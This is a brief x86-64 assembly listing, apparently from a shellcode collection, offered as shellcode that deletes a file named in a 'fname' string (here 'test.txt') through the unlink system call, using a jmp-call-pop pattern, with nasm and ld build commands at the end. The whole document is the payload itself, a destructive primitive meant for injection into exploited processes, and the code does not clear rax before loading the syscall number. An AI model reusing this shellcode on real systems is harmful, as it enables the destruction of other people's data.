This shellcode deletes file declared in "fname"


==================ASSEMBLY ========================================

global _start

section .text

_start:
	
	jmp short _file


delete:
	
	mov al,		87			;sys_unlink
	pop rdi                 ;fname 
	syscall
	
exit:
	xor rax,	rax
	mov al,		60			;sys_exit
	xor rdi,	rdi
	syscall


_file:
	
call delete
fname: db "test.txt"


=======Generate Shellcode==========================================
nasm -felf64 delete.nasm -o delete.o 
ld delete.o -o delete
